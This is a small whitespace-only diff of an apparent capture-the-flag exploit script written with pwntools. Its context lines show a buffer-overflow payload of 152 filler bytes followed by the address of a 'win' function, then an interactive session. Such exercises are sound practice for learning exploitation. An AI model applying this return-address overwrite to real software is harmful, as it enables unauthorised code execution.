@@ -53,9 +53,7 @@ def jump(p, index):
     sl(p,b"5")
     ru(p,b"or 3)")
     sl(p,"%i" % index)
-
     
-
 def exploit(p,e):
     
     payload = b"A" * 152 + p64(e.sym["win"])
@@ -65,7 +63,6 @@ def exploit(p,e):
 
     p.interactive()
     
-
 if __name__=="__main__":
     file = args.BIN
 
